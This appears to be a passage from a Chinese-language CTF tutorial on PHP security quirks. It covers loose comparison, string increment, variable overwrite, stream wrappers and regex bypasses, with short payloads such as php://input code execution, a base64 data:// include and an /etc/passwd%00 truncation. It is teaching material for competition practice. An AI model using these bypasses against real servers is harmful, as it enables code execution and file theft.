+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">"1abc"</span><span class="p">,</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">]));</span>  <span class="c1">// true！"1abc" 转成 1</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">"abc"</span><span class="p">,</span>  <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">]));</span>  <span class="c1">// true！转成 0，在数组里</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>文件上传白名单校验用 <code>in_array</code> 而没有加严格模式时，传 <code>0abc.php</code> 之类的文件名就可能绕过，这在 文件上传 章节还会用到。</p>
+<h3 id="switch-intval">switch 与 intval 的坑<a class="headerlink" href="#switch-intval" title="Permanent link">¶</a></h3>
+<p><code>switch</code> 语句的 case 比较使用的是 <code>==</code> 松散比较：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nv">$i</span> <span class="o">=</span> <span class="s2">"2abc"</span><span class="p">;</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="k">switch</span> <span class="p">(</span><span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="k">case</span> <span class="mi">0</span><span class="o">:</span> <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>        <span class="k">echo</span> <span class="s2">"hit"</span><span class="p">;</span>   <span class="c1">// 会命中 case 2</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>        <span class="k">break</span><span class="p">;</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="p">}</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p><code>intval()</code> 只取字符串开头的数字部分，且第二个参数是进制：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="s2">"1024abc"</span><span class="p">));</span>     <span class="c1">// 1024</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="s2">"0x1A"</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>    <span class="c1">// 26</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="s2">"0x1A"</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>     <span class="c1">// 26，base=0 时自动识别进制</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="nb">var_dump</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="s2">"42"</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>       <span class="c1">// 34，按八进制解析</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>典型考法：<code>if (intval($num) == 1024 &amp;&amp; $num !== "1024")</code>，答案就是传 <code>1024abc</code> 或者 <code>1024e0</code>。这类"既要==又要!="的题目，第一反应就是利用类型转换。</p>
+<h2 id="php_1">PHP 自增特性与字母数字绕过<a class="headerlink" href="#php_1" title="Permanent link">¶</a></h2>
+<p>PHP 中字符串变量可以自增，且遵循 Perl 风格而不是 C 风格：只处理字母数字，到达 <code>z</code>/<code>Z</code> 后向高位进位，<strong>永远不会变成数字类型</strong>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nv">$a</span> <span class="o">=</span> <span class="s2">"a"</span><span class="p">;</span> <span class="nv">$a</span><span class="o">++</span><span class="p">;</span>        <span class="c1">// "b"</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nv">$b</span> <span class="o">=</span> <span class="s2">"z"</span><span class="p">;</span> <span class="nv">$b</span><span class="o">++</span><span class="p">;</span>        <span class="c1">// "aa"</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nv">$c</span> <span class="o">=</span> <span class="s2">"Az"</span><span class="p">;</span> <span class="nv">$c</span><span class="o">++</span><span class="p">;</span>       <span class="c1">// "Ba"</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nv">$d</span> <span class="o">=</span> <span class="s2">"Zz"</span><span class="p">;</span> <span class="nv">$d</span><span class="o">++</span><span class="p">;</span>       <span class="c1">// "AAa"</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>减法则没有这个效果（<code>$a--</code> 对纯字母字符串不生效）。利用自增，我们可以在 <strong>不允许使用任何字母数字</strong>（正则 <code>/\W/</code> 级别的过滤）的环境下构造出任意函数名：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nv">$_</span> <span class="o">=</span> <span class="p">[];</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nv">$_</span> <span class="o">=</span> <span class="o">@</span><span class="s2">"</span><span class="si">$_</span><span class="s2">"</span><span class="p">;</span>          <span class="c1">// "Array"，数组转字符串</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="nv">$_</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="s1">'!'</span> <span class="o">==</span> <span class="s1">'@'</span><span class="p">];</span> <span class="c1">// "A"（'!'=='@' 为 false 即 0，取下标 0）</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="nv">$__</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">;</span> <span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="nv">$__</span><span class="o">++</span><span class="p">;</span> <span class="nv">$__</span><span class="o">++</span><span class="p">;</span>  <span class="c1">// "D"</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="c1">// 不断 ++ 并拼接，就能得到 "_GET"、"_POST"、"system" 等</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p><strong>典型 bypass 思路</strong>：题目过滤了所有字母数字，只允许 <code>$_++();</code> 之类的符号组合时，用自增从 <code>"Array"</code> 出发拼出 <code>_GET</code>，再通过 <code>$_=${_GET}[_];$_();</code> 执行任意函数。这类题在 RCE 章节的"无字母数字 RCE"部分会系统展开，本章只需要理解自增原理。</p>
+<h2 id="_4">闭合标签与短标签<a class="headerlink" href="#_4" title="Permanent link">¶</a></h2>
+<p>PHP 代码块的标准写法是 <code>&lt;?php ... ?&gt;</code>，但还有几种变体：</p>
+<ul>
+<li><code>&lt;?= ... ?&gt;</code>：短输出标签，等价于 <code>&lt;?php echo ... ?&gt;</code>，<strong>始终可用</strong>，不受 <code>short_open_tag</code> 配置影响；</li>
+<li><code>&lt;? ... ?&gt;</code>：短标签，需要 php.ini 中 <code>short_open_tag=On</code>；</li>
+<li><code>&lt;% ... %&gt;</code>：ASP 风格标签，需要 <code>asp_tags=On</code>，PHP 7 已移除。</li>
+</ul>
+<p>两个考点：</p>
+<p><strong>文件尾部的 <code>?&gt;</code> 可以省略</strong>，而且官方推荐省略——如果文件结尾有 <code>?&gt;</code>，后面多出来的换行或空格会被当作输出内容，可能造成 <code>header()</code> 之类的函数报错。反过来说，在文件上传题目中，如果题目把过滤逻辑写成"在文件末尾追加内容"，可以故意利用闭合标签让追加的内容落到 PHP 代码块外。</p>
+<p><strong><code>.htaccess</code> / <code>user.ini</code> 配合短标签</strong>：当上传点过滤了 <code>&lt;?</code> 但允许 <code>=</code> 开头时，<code>&lt;?=</code> 组合不含完整 <code>&lt;?</code> 的情况曾用于绕过某些弱正则。更常见的是：过滤 <code>&lt;?</code> 时用 <code>&lt;script language="php"&gt;...&lt;/script&gt;</code>（PHP 7 已移除）或短标签绕。</p>
+<h2 id="_5">可变变量与变量覆盖<a class="headerlink" href="#_5" title="Permanent link">¶</a></h2>
+<h3 id="_6">可变变量 <code>$$</code><a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
+<p>PHP 允许用变量的值作为变量名：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nv">$a</span> <span class="o">=</span> <span class="s2">"hello"</span><span class="p">;</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="nv">$$a</span> <span class="o">=</span> <span class="s2">"world"</span><span class="p">;</span>       <span class="c1">// 等价于 $hello = "world";</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="k">echo</span> <span class="nv">$hello</span><span class="p">;</span>         <span class="c1">// world</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="k">echo</span> <span class="s2">"</span><span class="si">$a</span><span class="s2"> </span><span class="si">${</span><span class="nv">$a</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>     <span class="c1">// hello world</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>几个高频考点：</p>
+<ul>
+<li><code>$$a</code> 与 <code>${$a}</code> 等价；</li>
+<li><code>${$_GET[1]}</code> 可以动态取变量，<code>$${$_GET[1]}</code> 则可以动态覆盖任意变量；</li>
+<li>特殊全局变量如 <code>$GLOBALS</code> 不能被 <code>$$</code> 覆盖。</li>
+</ul>
+<p><strong>经典例题</strong>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span>  <span class="c1">// $flag = "flag{...}";</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="nv">$highlight_file</span> <span class="o">=</span> <span class="s2">"index.php"</span><span class="p">;</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]))</span> <span class="p">{</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">];</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>    <span class="nv">$a</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"flag"</span><span class="p">,</span> <span class="s2">"????"</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>  <span class="c1">// 过滤 flag</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>    <span class="nv">$$a</span> <span class="o">=</span> <span class="nv">$highlight_file</span><span class="p">;</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>    <span class="k">echo</span> <span class="nv">$$a</span><span class="p">;</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="p">}</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p><code>str_replace</code> 过滤了 <code>flag</code> 字符串，没法直接覆盖 <code>$flag</code>。但 <code>${$a}</code> 能读任意变量：传 <code>?a=GLOBALS</code>，<code>$$a</code> 即 <code>$GLOBALS</code>，随后 <code>echo $GLOBALS</code> 会 dump 出所有变量包括 <code>$flag</code>。这是"过滤了变量名字符串但没过滤变量本身"的标准解法。</p>
+<h3 id="extract">extract()<a class="headerlink" href="#extract" title="Permanent link">¶</a></h3>
+<p><code>extract()</code> 把数组的键值导入为变量，默认会 <strong>覆盖同名变量</strong>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"flag{real_flag}"</span><span class="p">;</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$flag</span> <span class="o">==</span> <span class="s2">"givemeflag"</span><span class="p">)</span> <span class="p">{</span>   <span class="c1">// 已被 GET 参数覆盖</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="p">}</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>传 <code>?flag=givemeflag</code> 即绕过。还可以利用 <code>EXTR_SKIP</code> 之外的标记控制行为，但 CTF 中默认模式（<code>EXTR_OVERWRITE</code>）最常见。另一个考点是 <code>extract($_POST)</code> 后判断两个变量相等，此时同时覆盖两个变量即可。</p>
+<h3 id="parse_str">parse_str()<a class="headerlink" href="#parse_str" title="Permanent link">¶</a></h3>
+<p><code>parse_str($str, $result)</code> 解析 URL 查询字符串。如果 <strong>省略第二个参数</strong>，解析结果会直接注入当前作用域，效果等同 <code>extract</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"flag{xxx}"</span><span class="p">;</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="nb">parse_str</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">]);</span>  <span class="c1">// 危险用法</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$flag</span> <span class="o">==</span> <span class="s2">"1"</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">"ok"</span><span class="p">;</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>传 <code>?flag=1</code> 即可。另外 <code>parse_str</code> 会把变量名中的 <code>.</code> 和空格替换成 <code>_</code>，某些题目会反过来利用这一点绕过对特定参数名的过滤。</p>
+<h3 id="_7">变量覆盖防护结论<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
+<p>审计时看到 <code>extract($_GET)</code>、无第二参数的 <code>parse_str()</code>、<code>$$</code> 直接拼接用户输入、以及 <code>foreach ($_GET as $k =&gt; $v) { $$k = $v; }</code> 这种注册全局变量的老代码，基本就是考点所在。</p>
+<h2 id="_8">伪协议总览<a class="headerlink" href="#_8" title="Permanent link">¶</a></h2>
+<p>PHP 的 stream wrapper（伪协议）允许把文件操作函数（<code>file_get_contents</code>、<code>include</code>、<code>fopen</code>、<code>readfile</code> 等）的目标从本地文件扩展到各种特殊来源。这是 文件包含、任意文件读取、SSRF注入 等章节的共同基础，这里先建立总览，文件包含场景下的深入利用留在对应章节。</p>
+<p>常用伪协议一览：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">协议</th>
+<th style="text-align: left;">作用</th>
+<th style="text-align: left;">依赖配置</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>php://filter</code></td>
+<td style="text-align: left;">读写时对数据流做过滤/编码</td>
+<td style="text-align: left;">无</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>php://input</code></td>
+<td style="text-align: left;">读取 POST 原始请求体</td>
+<td style="text-align: left;"><code>allow_url_include</code>（include 时）</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>php://stdin</code> / <code>php://stdout</code></td>
+<td style="text-align: left;">标准输入输出流</td>
+<td style="text-align: left;">无</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>data://</code></td>
+<td style="text-align: left;">把内联数据当文件读</td>
+<td style="text-align: left;"><code>allow_url_fopen</code> + <code>allow_url_include</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>file://</code></td>
+<td style="text-align: left;">访问本地文件（绝对路径）</td>
+<td style="text-align: left;">无</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>phar://</code></td>
+<td style="text-align: left;">访问 phar 归档内文件，可触发反序列化</td>
+<td style="text-align: left;">无</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>zip://</code> / <code>compress.bzip2://</code> 等</td>
+<td style="text-align: left;">访问压缩包内文件</td>
+<td style="text-align: left;">对应扩展</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>glob://</code></td>
+<td style="text-align: left;">目录匹配（不支持远程）</td>
+<td style="text-align: left;">无</td>
+</tr>
+</tbody>
+</table>
+<h3 id="phpfilter">php://filter<a class="headerlink" href="#phpfilter" title="Permanent link">¶</a></h3>
+<p>读文件场景最常用的协议，可以把源码先 Base64 编码再读出来，从而拿到 <code>.php</code> 源码而不执行：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nv">$src</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="p">);</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="k">echo</span> <span class="nv">$src</span><span class="p">;</span>  <span class="c1">// flag.php 源码的 Base64，解码即得源码</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>也可以链式叠加多个过滤器，如 <code>convert.base64-encode|string.rot13|convert.base64-encode</code>。在"读文件但会 die 掉内容"的题目里，常用过滤器链把 flag 内容破坏成无法触发 die 的形式再读出来。进阶玩法（利用编码转换爆破出任意前缀的 <code>convert.iconv.*</code> 链）属于文件包含章节的内容。</p>
+<h3 id="phpinput">php://input<a class="headerlink" href="#phpinput" title="Permanent link">¶</a></h3>
+<p>配合 <code>include</code> 时可以直接执行 POST 体中的 PHP 代码：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nf">POST</span> <span class="nn">/index.php?file=php://input</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="err">&lt;?php phpinfo(); ?&gt;</span>
+</code></pre></div>
+<p>读文件函数下它返回 POST 原始数据，可以用来绕过 <code>file_get_contents($file) === "hello"</code> 这类校验：<code>file=php://input</code>，POST body 写 <code>hello</code>。</p>
+<h3 id="data">data://<a class="headerlink" href="#data" title="Permanent link">¶</a></h3>
+<p>把数据直接写在 URL 里：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="k">include</span> <span class="s2">"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"</span><span class="p">;</span>  <span class="c1">// 执行 phpinfo()</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>当 <code>allow_url_include</code> 开启且题目过滤了 <code>php://</code>、<code>http://</code> 时，<code>data://</code> 是常见替代方案。SSRF 题目里 <code>data://</code> 也常被用来内联构造响应内容。</p>
+<h3 id="phar">phar://<a class="headerlink" href="#phar" title="Permanent link">¶</a></h3>
+<p>phar 是 PHP 的打包归档格式，其元数据（meta-data）以序列化形式存储。<strong>任何文件操作函数在解析 <code>phar://</code> 路径时都会反序列化 phar 的元数据</strong>——这意味着只要能把精心构造的 phar 文件上传到服务器任意位置（伪装成图片都行），再找到一处可控的文件操作参数，就能触发反序列化，而不需要 <code>unserialize()</code> 调用点。具体利用链构造见 PHP反序列化 与 文件上传 章节。</p>
+<h2 id="_9">正则绕过<a class="headerlink" href="#_9" title="Permanent link">¶</a></h2>
+<p>出题人常用 <code>preg_match</code> / <code>preg_replace</code> 做黑名单过滤，正则本身的特性又成了新的考点。</p>
+<h3 id="00">%00 截断<a class="headerlink" href="#00" title="Permanent link">¶</a></h3>
+<p><code>preg_match</code> 处理的是字节流，传入带 <code>%00</code>（URL 编码的 NUL 字节）的字符串时，某些场景下正则匹配和字符串处理对 NUL 之后的部分处理不一致。最经典的场景是 <code>preg_replace</code> 的 <code>/e</code> 修饰符（PHP 5.5 前）配合 <code>\0</code> 截断，以及老式代码用 <code>ereg</code> 系函数（已废弃）时的 <code>%00</code> 截断——<code>ereg</code> 读到 NUL 就认为字符串结束，而后面的文件函数不这么认为。</p>
+<p>现代题目里 <code>%00</code> 更多出现在文件路径截断（PHP &lt; 5.3.4 的 <code>include $_GET['f'].".php"</code> 用 <code>?f=../../etc/passwd%00</code> 截掉后缀），属于 文件包含 与 目录穿越 章节的考点。</p>
+<h3 id="_10">换行绕过<a class="headerlink" href="#_10" title="Permanent link">¶</a></h3>
+<p>正则默认 <code>.</code> 不匹配换行符，且 <code>^</code>、<code>$</code> 只匹配整个字符串的首尾（除非加 <code>/m</code>）。所以：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^flag$/"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x'</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="s2">"no"</span><span class="p">);</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="c1">// 传入 "flag\n" 或 "flag\nxxx" 就可能绕过</span>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>反过来，用 <code>$</code> 锚定检测"危险字符串结尾"的正则，在 payload 后加一个 <code>\n</code>（URL 编码 <code>%0a</code>）即可绕过，因为 <code>$</code> 在 <code>/m</code> 缺失时允许字符串末尾有一个换行。这在 SQL 注入和命令注入过滤绕过中极常用。</p>
+<h3 id="_11">回溯上限绕过<a class="headerlink" href="#_11" title="Permanent link">¶</a></h3>
+<p>PHP 的 PCRE 引擎有回溯次数上限 <code>pcre.backtrack_limit</code>（默认 100 万）。当 <code>preg_match</code> 因超过回溯上限而失败时，<strong>返回值是 <code>false</code> 而不是 <code>0</code></strong>。如果题目用 <code>==</code> 判断：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/(.+)*flag/'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x'</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>    <span class="c1">// 认为没有匹配到 flag，放行</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="p">}</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>构造超长重复字符串（如 <code>"a" * 1000000 . "flag"</code>）让正则回溯爆炸，<code>preg_match</code> 返回 <code>false</code>，而 <code>false == 0</code> 为 <code>true</code>，绕过检测。Python 里一行生成 payload：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"print('a'*1000000 + 'flag')"</span>
+</code></pre></div>
+<h3 id="_12">换行与数组补充<a class="headerlink" href="#_12" title="Permanent link">¶</a></h3>
+<p>另外两个小点：<code>preg_match</code> 传入数组会返回 <code>false</code> 并 warning，同样可配合 <code>==</code> 绕过；<code>preg_replace</code> 的第一个参数支持数组，逐个替换的顺序差异也偶有出题。</p>
+<h2 id="each-create_function">each 与 create_function 等历史函数考点<a class="headerlink" href="#each-create_function" title="Permanent link">¶</a></h2>
+<p>这些函数在现代 PHP 中已被移除，但大量"老题"依赖它们，比赛环境为了兼容也常常跑老版本 PHP，所以仍需掌握。</p>
+<h3 id="each">each()<a class="headerlink" href="#each" title="Permanent link">¶</a></h3>
+<p>PHP 7.2 起废弃、8.0 移除。<code>each($arr)</code> 返回数组当前指针处的键值对，返回数组中同时有数字索引和字符串键：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nv">$arr</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"a"</span> <span class="o">=&gt;</span> <span class="s2">"1"</span><span class="p">,</span> <span class="s2">"b"</span> <span class="o">=&gt;</span> <span class="s2">"2"</span><span class="p">];</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="nv">$pair</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1">// $pair = [1 =&gt; "1", "value" =&gt; "1", 0 =&gt; "a", "key" =&gt; "a"]</span>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>考点通常在变量覆盖/键名注入：当代码用 <code>each</code> 遍历用户可控数组并拼接字符串时，控制返回的 <code>key</code>/<code>value</code> 位置可以注入恶意内容。</p>
+<h3 id="create_function">create_function()<a class="headerlink" href="#create_function" title="Permanent link">¶</a></h3>
+<p>PHP 7.2 废弃、8.0 移除。<code>create_function($args, $code)</code> 动态创建匿名函数，第二个参数会被拼进函数体执行——这等于一个隐蔽的 <code>eval</code>：</p>
